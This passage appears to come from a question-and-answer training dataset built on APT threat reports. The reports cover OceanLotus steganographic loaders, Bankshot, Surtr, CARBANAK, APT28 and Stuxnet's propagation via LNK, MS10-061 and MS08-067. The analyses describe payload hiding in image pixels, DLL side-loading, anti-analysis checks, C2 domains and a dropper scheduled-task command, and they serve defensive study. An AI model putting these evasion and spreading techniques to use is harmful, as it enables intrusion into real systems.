    "instruction": "Medium Headline: Overview\nThis particular OceanLotus malware loader attempts to imitate McAfee's McVsoCfg DLL and expects to be side-loaded by the legitimate \"On Demand Scanner\" executable. It arrives together with an encrypted payload stored in a separate .png image file. The .png cover file is actually a valid image file that is not malicious on its own. The payload is encoded inside this image with the use of a technique called steganography, which utilizes the least significant bits of each pixel's color code to store hidden information, without making overtly visible changes to the picture itself. The encoded payload is additionally encrypted with AES128 and further obfuscated with XOR in an attempt to fool steganography detection tools.\nBig Headline: Loader Analysis\nThe malicious DLL exports the same function names as the original mcvsocfg.dll library. All exports contain the exact same code which will decrypt the payload, inject it into memory, and execute it:\nThe payload is encoded inside a separate .png file using a technique called steganography. On top of that, the decoded payload is also encrypted with AES-128 and finally obfuscated with XOR 0x3B. It's worth noting that the XOR key is not hardcoded, but instead is read from the first byte of the C:\\Windows\\system.ini file:\nOne of the payloads we encountered was encoded inside an image of Kaito Kuroba1, the gentleman thief character from a popular Japanese manga series:\nTo extract the payload, the malware will first initialize the GDI+ API and get the image width and height values:\n1. BlackBerry Cylance owns the trademarks included in this white paper. All other trademarks are the property of their respective owners.\nThe size of the payload is encoded within the first four pixels of the image. After obtaining the size, the malware will allocate an appropriate memory buffer and proceed to decode the remaining payload byte by byte:\nThe payload is encoded in the same way as the size \u2013 each byte of the payload is computed from the ARGB color codes of each subsequent pixel in the image:\nIn case the payload is bigger than the image used to store it, the remaining payload bytes are simply attached to the image after its IEND marker, and read directly from the file:\nThe pixel encoding algorithm is fairly straightforward and aims to minimize visual differences when compared to the original image by only modifying the least significant bits of the red, green, and blue color byte values. The alpha channel byte remains unchanged.\nTo encode a byte of the payload, the first three bits (0-2) are stored in the red color, the next three bits (3-5) are stored in the green color, and the final two bits (6-7) are stored in the blue color. Decoding is a simple inverse operation:\nWindows converts the .png pixel RGBA value to an ARGB encoding via the GdpiBitmapGetPixel API, which results in the following decoding:\nFigure 9. Pixel color decoding\nFor example, an ARGB pixel value of 0xFF4086DB would yield the decoded byte 0xF0:\nTo aid in the recovery of encrypted payloads, the following Python script can be used to decode pixel colors from a .png image.\nAfter decoding the .png image, the loader then proceeds to initialize the key and IV used to perform AES decryption of the encrypted payload. Both values are supplied from an array of 256 pseudo-random bytes hardcoded in the binary's .rdata section. The first two bytes of that array specify the relative offsets to the key and IV respectively:\nFigure 12. Retrieving key and IV values\nFigure 13. AES key and IV inside an array of 256 pseudo-random bytes\nThe loader uses the AES128 implementation from the open-source Crypto++2 library, which is instantiated in the following manner:\nCBC_Mode<AES>::Decryption *AESDecryption = new CBC_Mode<AES>::Decryption((BYTE*)key, 16, iv);\nAESDecryption->ProcessData((byte *)decrypted, (byte *)encrypted, length);\nFigure 14. Crypto++ interface\n2\nWe were able to correlate most of the disassembly to the corresponding functions from the Crypto++ github source, and it doesn't appear that the malware authors have modified much of the original code. A SimpleKeyringInterface class is used to initialize the key, while the IV is passed to the SetCipherWithIV function:\nFigure 15. Algorithm and key initialization\nThe decryption is performed with the use of the StreamTransformationFilter class with the StreamTransformation cipher set to AES CBC decryption mode:\nFigure 16. Payload decryption with the use of CryptoPP StreamTransformationFilter class\nThe library code performs numerous checks for the CPU features, and based on the outcome, it will choose a processor-specific implementation of the cryptographic function:\nOne of the AES implementations makes use of the Intel AES-NI encryption instruction set which is supported by several modern Intel and AMD CPUs:\nFigure 18. Use of Intel AES-NI instruction set\nThe decrypted payload undergoes one final transformation, where it is XORed with the first byte read from the C:\\Windows\\system. ini file, which is expected to begin with a comment character ';' (0x3B):\nFigure 19. Removing the final layer of payload obfuscation\nPerforming the same steps in CyberChef, it is possible to decode the encrypted payload, which should yield x86 shellcode, starting with a call immediate opcode sequence:\nMedium Headline: Overview\nWhile this loader differs somewhat in general implementation, the payload extraction routine seems to be the same as in the previous variant. The main differences are:\n\u2022 The way the decryption routine is called (from within the DllMain function, as opposed to an exported function)\n\u2022 The way the payload is invoked (by overwriting the return address on the stack, as opposed to a direct call)\n\u2022 Implementation of an additional anti-analysis check that compares the name of the parent process to a string stored in an encrypted resource\nWe came across multiple variations of this DLL containing different parent process names, possibly targeted specifically to the victim's environment. Some of these names include processes related to security software:\n\u2022 wsc_proxy.exe\n\u2022 plugins-setup.exe\n\u2022 SoftManager.exe\n\u2022 GetEFA.exe\nMedium Headline: Loader Analysis\nThis DLL does not contain an export table and its entire functionality resides in the DllMain routine:\nUpon execution, the malware will first decrypt a string from its resources and compare it against the name of the parent process. If the names differ, the malware will simply exit without touching the payload. The resource containing the expected process name (ICON/1) is XORed with the first byte of the legitimate C:\\Windows\\system.ini file \u2013 0x3B (\";\"):\nFigure 23. Parent process name comparison\nIf the parent name matches, the malware will traverse the stack in order to find a return address that falls into the memory of the parent process's text section:\nFigure 24. Finding the return address on the stack\nNext, the payload is read from the .png cover file, which seems to have been taken from an inspirational quotes website3.  In this instance, the payload is fully contained within the image's pixel color codes, leaving no remaining data beyond the IEND marker:\nFinally, the loader will decrypt the payload to a memory buffer and overwrite the previously found return address with the pointer to that buffer, ensuring that the malicious shellcode will be executed when the DLL attempts to return to the caller:\nFigure 26. Overwriting return address with pointer to the decrypted payload\n3\nThe loader embedded in the payload seems to be a variant of the Veil \"shellcode_inject\" payload, previously used by Ocean Lotus to load older versions of Remy backdoor. In this instance, the shellcode is configured to load an encoded backdoor from within the payload:\nBig Headline: Backdoor Launcher\nThe final payload comes in a form of a launcher DLL that contains an encrypted backdoor in its .rdata section and a plain-text configuration in its resources. The resources also store one or more C2 communication modules. The backdoor DLL and the C2 communication DLLs are heavily obfuscated using high quantities of junk code, which significantly inflates their size and makes both static analysis and debugging more difficult.\nIn addition to Denes and Remy backdoors, at least two different communication modules were observed with different versions of this launcher \u2013 DNSProvider and HTTPProv.\nMedium Headline: Initial Shellcode\nThe launcher binary, which contains the final backdoor, is RC4 encrypted and wrapped in a layer of obfuscated shellcode. We can see the familiar DOS stub in plain text, but the rest of the header and binary body are encrypted:\nFigure 28. DOS stub in payload\nThe shellcode is obfuscated using OceanLotus's standard approach of flattening the control flow and inserting junk opcodes (as described in the ESET white paper on OceanLotus4):\nFigure 29. Garbage opcodes\n4\nThe shellcode starts in a fairly standard way \u2013 by walking the list of loaded modules in order to find the base of kernel32.dll library:\nFigure 32. Check for kernel32.dll\nOnce kernel32 base is found, the shellcode will calculate the addresses of LoadLibraryA and GetProcAddress functions, and use them to resolve other necessary APIs, which include VirtualAlloc, RtlMoveMemory, and RtlZeroMemory:\nFigure 33. Resolve kernel32.dll imports\nFigure 34. VirtualAlloc string constructed on the stack\nFigure 35. Shellcode imports\nAfter resolving the APIs, the shellcode will decrypt the launcher binary and load it to the memory. MZ header, PE header, as well as each section and their header, are decrypted separately using RC4 algorithm and a hardcoded key:\nFigure 36. Fragment of code for RC4 decryption of PE header\nOnce all sections are loaded, the relocations get fixed and the MZ/PE headers are zeroed out in memory:\nFigure 37. Find .reloc section in loaded module\nThe shellcode then proceeds to execute the payload DLL's entry point:\nFigure 38. Execute OEP of payload DLL\n\nQ: What additional anti-analysis checks does the OceanLotus loader implement to evade detection?",
    "output": "A: The OceanLotus loader includes an anti-analysis check that compares the name of the parent process to a string stored in an encrypted resource. If the names do not match, the malware exits without touching the payload. This check helps the malware to target specific environments and avoid analysis in controlled settings. Additionally, the loader traverses the stack to find a return address that falls into the memory of the parent process's text section, further complicating analysis efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Hidden Cobra Targets Turkish Financial Sector With New Bankshot Implant\nMarch 8,\n2018\nBy on Mar 08, 2018\nThis post was prepared with contributions from Asheer Malhotra, Charles Crawford, and Jessica Saavedra-Morales.\nOn February 28, the McAfee Advanced Threat Research team discovered that the cybercrime group Hidden Cobra continues to target cryptocurrency and financial organizations. In this analysis, we observed the return of Hidden Cobra's Bankshot malware implant surfacing in the Turkish financial system. Based on the code similarity, the victim's (<https://securingtomorrow.mcafee.com/mcafee-labs/attacks-swift-banking-system-benefit-insider-knowledge/>)business sector, and the presence of control server strings, this attack resembles by Hidden Cobra conducted against the global financial network\nIn this new, aggressive campaign we see a return of the Bankshot implant, which last appeared in 2017. Bankshot is designed to persist on a victim's network for further exploitation; thus the Advanced Threat Research team believes this operation is intended to gain access to specific financial organizations.\nBased on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document. The document contains an embedded Adobe Flash exploit, which was recently announced by the Korean Internet Security agency. The exploit, which takes advantage of allows an attacker to execute arbitrary code such as an implant.\nthe Further investigation into this campaign and analysis of McAfee product telemetry shows that the infection occurred on March 2 and 3. The implant's first target was a major government-controlled financial organization. It next appeared in another Turkish government organization involved in finance and trade. A further three large financial institutions in Turkey were victims of this attack. The implant has so far not surfaced in any other sector or country. This campaign suggests the attackers may plan a future heist against these targets by using Bankshot to gather information.\nBankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity. The malicious domain falcancoin.io was created December 27, 2017, and was updated on February 19, only a few days before the implants began to appear. These implants are variations of earlier forms of Bankshot, a remote\naccess tool that gives an attacker full capability on a victim's system. This implant also contains functionality to wipe files and content from the targeted system to erase evidence (<https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-B_WHITE.PDF>)or perform other destructive actions. Bankshot was first reported by the on December 13, 2017, and has only recently resurfaced in newly compiled variants. The sample we analyzed is 99% similar to the documented Bankshot variants from 2017.\nBankshot implants hosted on falcancoin.io.\nThe Bankshot implant is attached to a malicious Word document with the filename Agreement.docx. The document appears to be an agreement template for Bitcoin distribution between an unknown individual in Paris and a to-be-determined cryptocurrency exchange. The author of this document is test-pc. It was created February 26 and was submitted from the Netherlands. The document contains an embedded Flash script that exploits CVE-2018-4878 and downloads and executes the DLL implant from falcancoin.io.\nWe discovered two more documents, written in Korean, that exploit the same vulnerability as Agreement.docx. These documents appear to be part of the same campaign and may have been used on different targets. These documents also communicated with falcancoin.io to install Bankshot and also contain themes around cryptocurrency security.\nTwo Flash files exploit CVE-2018-4878.\n843c17b06a3aee22447f021307909890b68828b9 (February 25)\n343ebca579bb888eb8ccb811f9b52280c72e484c (February 25\nMalicious document exploiting CVE-2018-4878.\nThe implants are downloaded via a Flash file embedded in the malicious document. They are executed when the victim views the document.\nThe malicious site falcancoin.io embedded in the Flash file.\nImplant directory contained in the malicious Flash file.\nThe implants (DLLs) are disguised as ZIP files and communicate with three control servers, two of them Chinese-language online gambling sites. These URLs can be found hardcoded in the implants' code.\n\nQuestion: What are the characteristics and capabilities of the Bankshot implant used by Hidden Cobra, and how does it facilitate potential future heists against financial organizations? Discuss the implications of its functionality.\n\nAnswer:",
    "output": "The Bankshot implant used by Hidden Cobra is a remote access tool designed to persist on a victim's network for further exploitation. Its primary characteristic is providing the attacker with full capability on the victim's system, allowing them to execute arbitrary commands and gather sensitive information. Additionally, the implant contains functionality to wipe files and content from the targeted system, which can be used to erase evidence or perform other destructive actions. The implant is distributed from a domain named falcancoin.io, which mimics the legitimate cryptocurrency-lending platform Falcon Coin. By gaining access to specific financial organizations, the Bankshot implant facilitates potential future heists by enabling the attackers to gather critical information and maintain long-term access to the network. The implications of its functionality include the risk of significant financial loss, data breaches, and disruption of operations within the targeted organizations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "FIREEYE THREAT INTELLIGENCE\nSOUTHEAST ASIA: AN EVOLVING CYBER THREAT LANDSCAPE\nMARCH 2015\nSPECIAL REPORT\nMARCH 2015\nIntroduction\nKey Findings\nDetecting Targeted Threats in Southeast Asia and Beyond 4\nMalware Hitting Southeast Asian Targets 5\nTargeted Malware, Industry Breakdown 6\nDetecting Non-Targeted Threats 6\nSoutheast Asia's Leading Industry Sectors Attract APT Actors 7\nRegional Governments and Militaries: In APT Groups' Crosshairs\nWhile many of the headline-grabbing cyber security breaches of 2014 involved major U.S. companies, Southeast Asia quietly dealt with its share of cyber attacks. Like the U.S., companies in this region face a complex threat landscape filled with advanced cyber attackers intent on stealing corporate data and state secrets.\nAdvanced persistent threat (APT) actors are one of the biggest challenges for the region. Leading companies that do business in the energy, telecommunications, high-tech, finance, and transportation sectors are targets of APT groups.\n\nWhy are leading companies in the energy, telecommunications, high-tech, finance, and transportation sectors in Southeast Asia particularly targeted by Advanced Persistent Threat (APT) groups? How does this reflect the broader cyber threat landscape in the region?",
    "output": "Leading companies in the energy, telecommunications, high-tech, finance, and transportation sectors in Southeast Asia are particularly targeted by Advanced Persistent Threat (APT) groups because these sectors are critical to national infrastructure and economic stability. These industries often possess valuable corporate data and state secrets that are attractive to advanced cyber attackers. The focus on these sectors reflects a complex threat landscape in Southeast Asia, similar to that faced by major U.S. companies, where sophisticated adversaries aim to steal sensitive information for various strategic purposes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the evolution of the binary C2 protocol in CARBANAK samples support the theory that the project is distributed to operators rather than centrally managed?",
    "output": "The discovery of five versions of the binary C2 protocol, each improving upon the previous version, suggests ongoing development and adaptation to evade detection. However, the presence of outdated protocol versions in some samples, despite newer versions being available, indicates that not all operators are using the latest builds. This discrepancy suggests that the CARBANAK project is distributed to various operators who may compile their own builds independently, rather than being centrally managed and updated.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Breaking The Weakest Link Of The Strongest Chain\nAround July last year, more than a 100 Israeli servicemen were hit by a cunning threat actor. The attack compromised their devices and exfiltrated data to the attackers' command and control server. In addition, the compromised devices were pushed Trojan updates, which allowed the attackers to extend their capabilities. The operation remains active at the time of writing this post, with attacks reported as recently as February 2017.\nThe campaign, which experts believe is still in its early stages, targets Android OS devices. Once the device is compromised, a process of sophisticated intelligence gathering starts, exploiting the ability to access the phone's video and audio capabilities, SMS functions and location.\nThe campaign relies heavily on social engineering techniques, leveraging social networks to lure targeted soldiers into both sharing confidential information and downloading the malicious applications.\nCharacterized by relatively unsophisticated technical merit, and extensive use of social engineering, the threat actor targets only IDF soldiers.\nIDF C4I & the IDF Information Security Department unit, with Kaspersky Lab researchers, have obtained a list of the victims; among them IDF servicemen of different ranks, most of them serving around the Gaza strip.\n\nQ: How did the threat actor behind the 'Breaking The Weakest Link Of The Strongest Chain' campaign leverage social engineering to compromise over 100 Israeli servicemen's Android devices, and what specific capabilities did the attackers gain once the devices were compromised?",
    "output": "A: The threat actor behind the 'Breaking The Weakest Link Of The Strongest Chain' campaign utilized social engineering techniques extensively, leveraging social networks to lure targeted soldiers into sharing confidential information and downloading malicious applications. This approach was particularly effective despite the relatively unsophisticated technical merit of the attack. Once the Android devices were compromised, the attackers gained several specific capabilities, including access to the phone's video and audio capabilities, SMS functions, and location data. This allowed them to conduct sophisticated intelligence gathering and push Trojan updates to the compromised devices, further extending their control and surveillance capabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Delivery Mechanism\nWhile the malicious attachments appear to be DOC files due to their file extension, they are actually RTFs crafted to exploit a vulnerability in Microsoft Word: CVE-2012-0158.\nThis particular vulnerability was first exploited in early April 2012 and a patch was released by Microsoft on April 10, 2012. Currently, the sample is detected as malicious by 34 percent of antivirus (AV) engines on VirusTotal (VT).\nThe malicious attachment is created using a shared template that we have seen used against multiple Tibetan groups. This template was created in March 2013 and, instead of specifically using the vulnerable ActiveX controls described in the vulnerability description, it utilizes the Chartspace Office Web Component. This component either suffers from the same vulnerability or uses one of the named ActiveX controls resulting in the attacker being able to execute malicious code.\nFigure 1: Hexdump of the malicious attachment\nAlthough CVE-2012-0158 was first published and used in the wild in April 2012, samples using this template were only initially detected by three AV engines (on VT). Therefore, while a third of AV engines had a detection signature for CVE-2012-0158 as late as April 2013, it was possible to design a document using a year old vulnerability that was recognized as malicious by very few AV products. This number has since risen and it is currently being detected by 34 percent of the AV products listed on VT.\nThis vulnerability highlights the need to keep both operating systems and applications up to date as well as to exercise vigilance concerning links and email attachments.\nMalicious attachments with this template all use a similar dropper which originally drops the payload to the temporary file directory.\nBig Headline: Payload\nSurtr creates either a new explorer or iexplore process and injects itself into this new process using CreateRemoteThread function.\nIt also creates the following folders:\n%ALL USERS%/Application Data/Microsoft/Windows/123\n%ALL USERS%/Application Data/Microsoft/Windows/Burn\n%ALL USERS%/Application Data/Microsoft/Windows/LiveUpdata_Mem\nIt creates multiple copies of the payload including in both the Burn and LiveUpdata_Mem folders. The copy in the Burn folder is called [VICTIM COMPUTER NAME].dll and there are three copies in the LiveUpdata_Mem folder whose names consist of 6 random alphanumeric characters which are then appended with .dll, _Fra.dll and _One.dll. These copies will differ from the original payload dropped in the %TEMP% folder by filling the resource section with varying amounts of 00 bytes. This also results in the malware having a much larger file size (30-50mb) possibly in an attempt to evade antivirus heuristics.\nSurtr connects to a command and control server (C2) and downloads a stage two component to %ALL USERS%/Application Data/Microsoft/Windows/Burn/_[VICTIM COMPUTER NAME].log. This particular sample connects to internet.3-a.net on port 9696.\nIn May 2012, internet.3-a.net resolved to the same IP (184.82.123.143) as android.uyghur.dnsd.me, which is a C2 used in Android malware attacks that targeted the Tibetan community as previously documented by the Citizen Lab.\nThe stage two component that was downloaded in this particular case has an internal name of x86_GmRemote.dll, however we have seen an alternate stage two used with the name Remote.dll as well. Our analysis in this post focuses on the GmRemote variation as it has been seen in multiple attacks.\nSurtr's capabilities include listing of file directories and contents on the victim computer and any USB drives connected to a victim machine, viewing web cache, executing remote commands and logging keystrokes.\nIn order to store temporary information, Surtr creates the following folders:\n%ALL USERS%/Application Data/Microsoft/Windows/MpCache\n%ALL USERS%/Application Data/Microsoft/Windows/nView_DiskLoydb\n%ALL USERS%/Application Data/Microsoft/Windows/nView_KeyLoydb\n%ALL USERS%/Application Data/Microsoft/Windows/nView_skins\n%ALL USERS%/Application Data/Microsoft/Windows/UsbLoydb\nFor example, in nView_DiskLoydb, a file called FileList.db that contains file and directory listings will be placed and nView_KeyLoydb will contain text files with keylogger output. The keylogger output is disguised by adding a constant to the ordinal value of the character.\nThis data can then be sent to the C2. It is compressed using zlib DEFLATE so the network traffic is not human readable without decompression.\nIt can also download additional malware onto the victim computer, which can provide attackers with further abilities like accessing the victim computer's webcam or microphone. In particular, we have seen Surtr used in conjunction with the Gh0st RAT derived LURK0 malware.\nFor persistency, Surtr adds a key to the registry to ensure it runs when the infected computer is restarted. It also stores its C2 information and a campaign code in the registry.\nDepending on the configuration, Surtr will either create multiple registry keys in Software\\Microsoft\\Windows Media in HKU (hkey users) with text data or a single key called XC consisting of binary data. These are usually xor encrypted with a key of 0\u00d71.\nFigure 2: Encrypted data in XC key\nBig Headline: Other Samples & Variations\nWe have seen a large number of similar samples sent to Tibetan groups that use the same stage two (GmRemote) and communicate with the following C2s: dtl.dnsd.me, dtl.eatuo.com, dtl6.mooo.com and tbwm.wlyf.org. These C2s were also used in previous attacks documented in an earlier Citizen Lab post on LURK0 malware targeting the Tibetan community.\nOne particular sample (md5: ad9e5f79585eb62bc40b737e98bfd62e) which connects to C2 domain dtl6.mooo.com (which resolved to the same IP as the other dtl domains mentioned above) on port 6178 was seen to download LURK0 malware after the initial Surtr infection. This LURK0 sample had the campaign code ZQ6 that connects to C2 domain tbwm.wlyf.org on port 3103. This domain also resolved to the same IP as the dtl domains.\nWe have also found reports of other Surtr stage 2 (GmRemote) samples that have campaign codes which suggest they may be targeted at commercial and government targets.\nThe first sample was found via ThreatExpert. It uses campaign code kmlg-0308, and connects to a C2 at flyoutside.com. This domain and eight others are registered to toucan6712@163.com:\nSearching for more samples in Virus Total Intelligence (VTI) using domains and other identifying features reveals four related files:\n7fbdd7cb8b46291e944fcecd5f97d135 \u2013 connects to C2 domain www.flyoutside.com, campaign code kmlg-0409tb\n58ff38412ebbedb611a3afe4b3dbd8b0 \u2013 connects to C2 IP 112.121.182.149 (similar to above), campaign code lly-0311\n81bc8974967e1c911b107a9a91e3178b \u2013 connects to C2 domain www.paulfrank166.2waky.com (192.198.85.102), campaign code 0201-2116\n44758b9a7a6cafd1b8d1bd4c773a2577 \u2013 connects to C2 domain www.flyoutside.com (same as the first sample found on ThreatExpert), campaign code lg-0109\nMost of these samples have campaign codes that suggest commercial targets. However, we do not have information about where these samples were submitted from, so the target sector and victims cannot be confirmed.\nA second GmRemote sample was found via the web, called Trojan/Subxe.89E1 by Anchiva. This sample connects to google.djkcc.com and uses campaign code in1102. Other subdomains under djkcc.com include:\nairforce.djkcc.com\ndomain.djkcc.com\ngoogle.djkcc.com\nindianembassy.djkcc.com\nmailnic.djkcc.com (MailNIC is an Indian email site at the National Informatics Centre)\nmicrosoft.djkcc.com\nrediffmail.djkcc.com (Rediffmail is an Indian email site)\nWhile we do not have information about what victims these samples target, the campaign code, C2 domain, and related subdomains give some possible indications.\nOne additional find via VTI is a GmRemote sample internally named: GmKeyBoradServer_DLL.dll (MD5 e7e1c69496ad7cf093945d3380a2c6f4).\nIt exports functions (GmFunctionType, GmInitPoint, GmMyInitPoint, GmRecvPoint, GmShutPoint, GmVerSion) that are referenced in other GmRemote samples, although none of them have any real content.\nThese additional samples suggest that Surtr is being used to target groups beyond the Tibetan community and is possibly being utilized by multiple threat actors.\nRead the text above and answer this question: How does the Surtr malware exploit the CVE-2012-0158 vulnerability in Microsoft Word, and why might this approach be effective even though the vulnerability was patched over a year before the attack?",
    "output": "The Surtr malware exploits the CVE-2012-0158 vulnerability by utilizing a shared template that employs the Chartspace Office Web Component, which either suffers from the same vulnerability or uses one of the named ActiveX controls, allowing the attacker to execute malicious code. This approach is effective because, despite the vulnerability being patched in April 2012, the specific template used in the attack was only initially detected by three antivirus engines on VirusTotal. This highlights that even year-old vulnerabilities can be exploited if the attack is designed in a way that evades most antivirus detections.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Indicators of Compromise (IOCs) [Downloadable Files]:\nIf a log search for any of these Indicators of Compromise returns positive hits, we recommend you initiate appropriate cyber investigative processes immediately and engage Law Enforcement where appropriate.\nRecommendations\nEvidence suggests this campaign may be in the early execution phase. As such, a number of preventative and detective controls can be instrumented to deter this Threat Actor from achieiving their mission:\nBlock traffic to and from any of the above listed domains and IP addresses on proxies and firewalls.\nBlock emails originating from or going to aforementioned domains (worlddopingagency[.]com and dopingagency[.]com).\nSearch through SIEM/Log Analysis tools for traces of connections to and from these domains or IP addresses, as well as proactively create alerting rules in SIEM or IDS/IPS.\nRecommendation for WADA: Get these domains taken down ASAP.\nQ: Given the indicators of compromise (IOCs) related to the APT28 campaign targeting the World Anti-Doping Agency (WADA), how would you implement preventative and detective controls to mitigate the threat? Explain the steps and the reasoning behind each control.",
    "output": "To mitigate the threat posed by the APT28 campaign targeting WADA, several preventative and detective controls can be implemented. Firstly, blocking traffic to and from the identified malicious domains and IP addresses on proxies and firewalls is crucial. This prevents any communication with the threat actor's infrastructure, reducing the risk of data exfiltration or further compromise. Secondly, blocking emails originating from or going to the suspicious domains (worlddopingagency[.]com and dopingagency[.]com) helps in preventing phishing attempts, which are often the initial vector for such attacks. Additionally, searching through SIEM/Log Analysis tools for traces of connections to and from these domains or IP addresses allows for the identification of any potential compromises that may have already occurred. Proactively creating alerting rules in SIEM or IDS/IPS systems ensures that any future attempts to connect to these malicious endpoints are immediately flagged and investigated. Finally, it is recommended that WADA takes action to get these domains taken down as soon as possible to remove the threat entirely.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3.1.2 Metasploit and WebDAV Exploit\nA few days after the public debate concerning .LNK PoC exploitation, the Metasploit Framework released code including implementation of the exploit in order to allow remote attacks (), Prior to the release of this exploit, it was believed that this vulnerability is not exploitable for remote attacks. Researchers from the Metasploit Project showed that this was not the case, by using the UNC path to the WebDAV service (). This vulnerability is still functional. This exploit used a WebDAV service that can be used to execute an arbitrary payload when accessed as a UNC path by following the link generated by Metasploit that displays the directory containing .LNK file and DLL module with payload.\nThe .LNK file contains the network path to the module with the payload.\nThe vulnerability in .LNK files and the recently discovered DLL Hijacking vulnerability () have much in common, both in the nature of their appearance, and in the ways in which they've been exploited.\nSmall Headline: 3.1.3 What Do DLL Hijacking Flaws and the LNK Exploit have in Common?\nWhile we have been writing this report public information was released about DLL Hijacking flaws (Microsoft Security Advisory 2269637) and we noted some association with or resemblance to the .LNK files vulnerability. Both vulnerabilities are inherent design flaws and in both cases the function LoadLibrary() is used. The directory where the exploitative file is found can be situated in a USB drive, an extracted archive, or a remote network share. In both cases we find spoofed paths to a loadable module and the possibility of a remote attack via the WebDAV service.\nWhat other vulnerabilities are stored in Windows operating systems, nobody knows. Most likely, this vector of attack will undergo a thorough research and it might be that something else equally interesting is awaiting us in the near future.\nMedium Headline: 3.2 LNK Vulnerability in Stuxnet\nThis is the first way in which the rootkit distributes itself. When you inspect a flash USB drive infected with the Stuxnet worm you can expect to find 6 files there as on the following screenshot:\nCopy of Shortcut to.lnk;\nCopy of Copy of Shortcut to.lnk;\nCopy of Copy of Copy of Shortcut to.lnk;\nCopy of Copy of Copy of Copy of Shortcut to.lnk;\n~WTR4141.TMP;\n~WTR4132.TMP.\nThe first four files are LNK files \u2013 these are the files that specify how the Icon of other files should be displayed. The files with LNK extension are different: here is an example of the contents of one of them:\nThe worm exploits the CVE-2010-2568 vulnerability (see section for details) to infect the system. You can see in the figure above the highlighted name of the module to be loaded during the exploitation of the vulnerability. When a user tries to open an infected USB flash drive with an application that can display icons for shortcuts, the file with the name ~WTR4141.TMP is loaded and its entry point is called. The file is, in fact, a dynamic link library, the main purpose of which is to load another file with the name ~WTR4132.TMP from the infected flash drive.\nThe files with the .LNK filename extension are essentially the same except they specify different paths to the single file:\n\\\\.\\STORAGE#Volume#_??_USBSTOR#Disk&Ven_____USB&Prod_FLASH_DRIVE&Rev_#1 2345000100000000173&0#{53f56307-b6bf-11d0-94f2-00a0c91efb8b}#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\~WTR4141.tmp;\n\\\\.\\STORAGE#Volume#1&19f7e59c&0&_??_USBSTOR#Disk&Ven_____USB&Prod_FLASH _DRIVE&Rev_#12345000100000000173&0#{53f56307-b6bf-11d0-94f2-00a0c91efb8b}#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\~WTR4141.tmp;\n\\\\.\\STORAGE#RemovableMedia#8&1c5235dc&0&RM#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\~WTR4141.tmp;\n\\\\.\\STORAGE#RemovableMedia#7&1c5235dc&0&RM#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\~WTR4141.tmp.\nAll these strings specify a path to the file located on the removable drive, and are used instead of a short form of the path with a drive letter. The first part of the path to the file (before the backslash \"\\\" that precedes the filename) is a symbolic link name referring to the corresponding volume, as we can see on the figure below:\nThe first entry in figure 3.12 corresponds to the volume representing a USB flash drive, the name of which is \\Device\\HarddiskVolume5. Notably, that drive letters are symbolic link names too that refer to the same device objects:\nStuxnet uses the long versions of pathnames because it is impossible to predict what letter corresponds to a removable drive in a remote system, and as a result, the short paths are likely to be incorrect in some cases. The longer variant of a path is constructed with respect to certain rules and configuration information obtained from the hardware, so that we can predict with considerable accuracy what symbolic link name corresponds to a device on a remote machine.\nThe rules according to which these symbolic links are constructed vary depending on the operating system, which is why Stuxnet uses four distinct .LNK files. For instance, the first entry in the list presented above won't work on Windows XP but will work on Windows 7, the second entry works on Windows Vista, while the last two entries work on Windows XP, Windows Server 2003 and Windows 2000.\nMedium Headline: 3.3 The MS10-061 Attack Vector\nAnother way in which the worm replicates itself over the network exploits a vulnerability in Window Spooler (MS10-061). Machines with file and printer sharing turned on are vulnerable to the attack. This vulnerability results in privilege escalation allowing a remote user using a Guest account to write into %SYSTEM% directory of the target machine.\nThe attack is performed in two stages: during the first stage the worm copies the dropper and additional file into Windows\\System32\\winsta.exe and Windows\\System32\\wbem\\mof\\sysnullevnt.mof respectively, while at the second stage the dropper is executed.\nThe first stage exploits the MS10-061 vulnerability. Under certain conditions the spooler improperly impersonates a client that sends two \"documents\" for printing as we can see on the figure below.\nThese documents are \"printed\" to files in the %SYSTEM% directory while a user has Guest privileges that shouldn't entail access rights to the %SYSTEM% directory. During exploitation of the vulnerability, a thread of the process spoolsv.exe calls an API function StartDocPrinter() with parameter specifying the following information about document to be printed:\ntypedef struct _DOC_INFO_1 {\n} DOC_INFO_1;\nIn the middle of September 2010, Microsoft released a security patch to fix MS10-061. We have compared the original executable spoolsv.exe with the patched executable and found some functional differences. One of the most important differences concerns the YStartDocPrinter function which is eventually called in order to print a document. On the figure below we provide a graphical representation of the functions.\nThe left-hand side represents the patched function while on the right-hand the original is displayed. The functions are in general the same, but some additional checks have been added, and these are highlighted in red. Before printing a document the function performs the following checks:\nwhether the caller belongs to Local group;\nwhether OutputFile parameter is NULL or equal to a port name of the printer: otherwise\na client needs to have appropriate access rights to write to the specified file.\nThe sequence of check is presented on the figure below.\nThe second stage of the attack employs the file wbem\\mof\\sysnullevnt.mof : that is, a Managed Object Format file. Files of this type are used to create or register providers, events, and event categories for WMI. Under certain conditions this file runs winsta.exe (the dropper) and its execution by the system results in the infection of the system.\nMedium Headline: 3.4 Network Shared Folders And RPC Vulnerability (MS08-067)\nThe worm is also capable of distributing itself over the network through shared folders. It scans network shares c$ and admin$ on the remote computers and installs a file (dropper) there with the name DEFRAG<GetTickCount>.TMP, and schedules a task to be executed on the next day:\nrundll.exe \"C:\\addins\\DEFRAGdc2d0.TMP\", DllGetClassObject\nStuxnet's exploitation of the MS08-67 vulnerability to propagate itself through the network is comparable to the use of the same vulnerability by the network worm Conficker. Its exploit is implemented as a separate module. We have compared the two exploit implementations in Conficker and Stuxnet and found that the shell codes that have been used are different. Stuxnet's shell code is rather sophisticated and employs advanced techniques that have 